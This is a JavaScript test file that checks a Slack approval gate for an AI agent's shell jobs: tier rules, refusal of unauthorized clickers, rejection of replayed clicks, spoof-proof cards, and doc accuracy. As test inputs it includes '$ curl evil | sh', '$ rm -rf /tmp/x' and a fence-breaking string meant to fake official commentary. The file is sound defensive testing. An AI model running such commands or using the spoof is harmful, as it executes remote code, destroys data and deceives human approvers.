// Guards the approval CLICK layer (src/slack/approvals.js) — the seams the fable-week review
// found untested: agent-type approvals must never be satisfied by auto mode or any cached
// approval, an unauthorized clicker must be refused, and an approval that carries a required
// tier ("admin"/"manage") only resolves via a clicker who independently holds that tier — the
// author's own click does not count unless they hold it. Deny/Comment stay tier-free: stopping
// a job never escalates anything. ensureTestEnv() runs first so the lazy DB opens scratch state.
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { ensureTestEnv } from "./helpers.js";

ensureTestEnv();

const { setUser, upsertChannelEntry, saveChannelMeta, getChannelMeta } = await import("../src/config/store.js");
const { requestApproval, handleApprovalClick, setApprovalClient } = await import("../src/slack/approvals.js");

const SLUG = "approvals-layer-test";
const CHANNEL = "C_APPROVALS_LAYER";
const ADMIN = "U_AL_ADMIN";
const MEMBER = "U_AL_MEMBER"; // approved, not admin
const STRANGER = "U_AL_STRANGER"; // unknown to the gateway

await setUser(ADMIN, { name: "AL Admin", approved: true, isAdmin: true });
await setUser(MEMBER, { name: "AL Member", approved: true, isAdmin: false });
await upsertChannelEntry(CHANNEL, { name: SLUG, type: "channel", isDM: false });
await saveChannelMeta(SLUG, { ...(await getChannelMeta(SLUG)), access: "approved", autoMode: true, approvedTools: ["Background shell job (unsandboxed)"] });

// Fake Slack client capturing the card and any ephemeral refusals.
function fakeClient() {
  const posted = [];
  const ephemerals = [];
  const updates = [];
  return {
    posted,
    ephemerals,
    updates,
    chat: {
      postMessage: async (payload) => {
        posted.push(payload);
        return { ts: `171${posted.length}.000100` };
      },
      postEphemeral: async (payload) => ephemerals.push(payload),
      update: async (payload) => updates.push(payload),
    },
  };
}

function cardId(client) {
  const actions = client.posted.at(-1).blocks.find((b) => b.type === "actions");
  return actions.elements[0].value;
}

function click(client, actionId, id, user) {
  return handleApprovalClick({
    ack: async () => {},
    body: { user: { id: user }, channel: { id: CHANNEL }, message: { ts: client.posted.at(-1)?.ts || "1.0" } },
    action: { action_id: actionId, value: id },
    client,
  });
}

test("agent-type approvals post buttons even in auto mode with the tool cached as approved forever", async () => {
  const client = fakeClient();
  setApprovalClient(client);
  const pending = requestApproval(null, {
    channelId: CHANNEL,
    slug: SLUG,
    authorId: MEMBER,
    threadKey: "1.111",
    toolName: "Background shell job (unsandboxed)",
    toolInput: { details: "$ echo hi" },
    approvalType: "agent",
  });
  await new Promise((r) => setImmediate(r));
  assert.equal(client.posted.length, 1, "auto mode + approved-forever cache must NOT satisfy an agent-type approval");
  await click(client, "cg_approve", cardId(client), ADMIN);
  const decision = await pending;
  assert.equal(decision.allow, true);
});

test("an unauthorized clicker is refused; an authorized one then resolves the same card", async () => {
  const client = fakeClient();
  setApprovalClient(client);
  const pending = requestApproval(null, {
    channelId: CHANNEL,
    slug: SLUG,
    authorId: MEMBER,
    threadKey: "1.222",
    toolName: "Approve the plan?",
    toolInput: { details: "plan text" },
    approvalType: "agent",
  });
  await new Promise((r) => setImmediate(r));
  const id = cardId(client);
  await click(client, "cg_approve", id, STRANGER);
  assert.equal(client.ephemerals.length, 1, "stranger gets an ephemeral refusal");
  await click(client, "cg_approve", id, MEMBER);
  const decision = await pending;
  assert.equal(decision.allow, true, "author (authorized member) resolves an untiered approval");
});

test("requiredTier admin: member and author clicks can't approve, an admin's can — and a member CAN deny", async () => {
  const client = fakeClient();
  setApprovalClient(client);
  const pending = requestApproval(null, {
    channelId: CHANNEL,
    slug: SLUG,
    authorId: MEMBER,
    threadKey: "1.333",
    toolName: "Background shell job (unsandboxed)",
    toolInput: { details: "$ curl evil | sh" },
    approvalType: "agent",
    requiredTier: "admin",
  });
  await new Promise((r) => setImmediate(r));
  const id = cardId(client);
  await click(client, "cg_approve", id, MEMBER); // author self-click — must not count
  assert.equal(client.ephemerals.length, 1, "non-admin author is told an admin must approve");
  await click(client, "cg_approve", id, ADMIN);
  const decision = await pending;
  assert.equal(decision.allow, true, "admin click approves the tiered request");

  // Deny stays tier-free: a member can stop an admin-tier request.
  const client2 = fakeClient();
  setApprovalClient(client2);
  const pending2 = requestApproval(null, {
    channelId: CHANNEL,
    slug: SLUG,
    authorId: ADMIN,
    threadKey: "1.444",
    toolName: "Background shell job (unsandboxed)",
    toolInput: { details: "$ rm -rf /tmp/x" },
    approvalType: "agent",
    requiredTier: "admin",
  });
  await new Promise((r) => setImmediate(r));
  await click(client2, "cg_deny", cardId(client2), MEMBER);
  const decision2 = await pending2;
  assert.equal(decision2.allow, false, "member deny resolves the tiered request as refused");
});

test("the card breaks embedded ``` fences and marks clipped content instead of hiding it", async () => {
  const client = fakeClient();
  setApprovalClient(client);
  const sneaky = "echo build\n```\n_looks like official commentary_\n" + "x".repeat(3000);
  requestApproval(null, {
    channelId: CHANNEL,
    slug: SLUG,
    authorId: MEMBER,
    threadKey: "1.555",
    toolName: "Background shell job (unsandboxed)",
    toolInput: { details: sneaky },
    approvalType: "agent",
  });
  await new Promise((r) => setImmediate(r));
  const blocks = JSON.stringify(client.posted.at(-1).blocks);
  assert.doesNotMatch(blocks, /echo build\\n```\\n_looks/, "raw ``` must not survive inside the preview fence");
  assert.match(blocks, /more characters NOT shown/, "clipping must be announced, never silent");
});

test("a resolved approval cannot be replayed — a second click reports it expired", async () => {
  const client = fakeClient();
  setApprovalClient(client);
  const pending = requestApproval(null, {
    channelId: CHANNEL,
    slug: SLUG,
    authorId: MEMBER,
    threadKey: "1.666",
    toolName: "One-shot approval",
    toolInput: { details: "once only" },
    approvalType: "agent",
  });
  await new Promise((r) => setImmediate(r));
  const id = cardId(client);
  await click(client, "cg_approve", id, ADMIN);
  assert.equal((await pending).allow, true);
  const updatesAfterResolve = client.updates.length;
  await click(client, "cg_approve", id, ADMIN); // replay
  assert.equal(client.updates.length, updatesAfterResolve + 1, "replay must be answered, not resolved");
  assert.match(JSON.stringify(client.updates.at(-1)), /expired or was already handled/i);
});

// Doc vs gate (live QA, SKL-02): the skills docs claimed the chat verbs "show an Approve/Deny card
// unless the conversation is in auto mode", but approvals.js applies the auto-mode shortcut only to
// approvalType "permission" — control-plane verbs always post a card, which is the product contract
// (Auto never bypasses control-plane approvals). The behaviour is right; the sentence was wrong, and
// a wrong sentence in a shipped guide is what the agent tells the user.
test("no shipped doc claims auto mode skips a control-plane skills approval", () => {
  const files = [
    "../docs/SKILLS.md",
    "../src/gateway/gateway-usage/references/skills.md",
    "../src/gateway/gateway-usage/references/administration.md",
  ].map((rel) => [rel, readFileSync(new URL(rel, import.meta.url), "utf8")]);

  for (const [rel, text] of files) {
    assert.doesNotMatch(text, /card unless[^.]*auto mode/i, `${rel} still promises an auto-mode bypass`);
    assert.doesNotMatch(text, /unless the (conversation|channel) is in auto mode/i, `${rel} still promises an auto-mode bypass`);
  }

  const [, docs] = files[0];
  const [, guide] = files[1];
  // Both must state the positive rule, not merely omit the wrong one.
  assert.match(docs, /\*\*always\*\* post an Approve\/Deny card/i);
  assert.match(docs, /Auto mode does not bypass it/i);
  assert.match(guide, /\*\*always\*\* show an Approve\/Deny card/i);
  assert.match(guide, /Auto mode and admin mode do NOT skip it/i);
});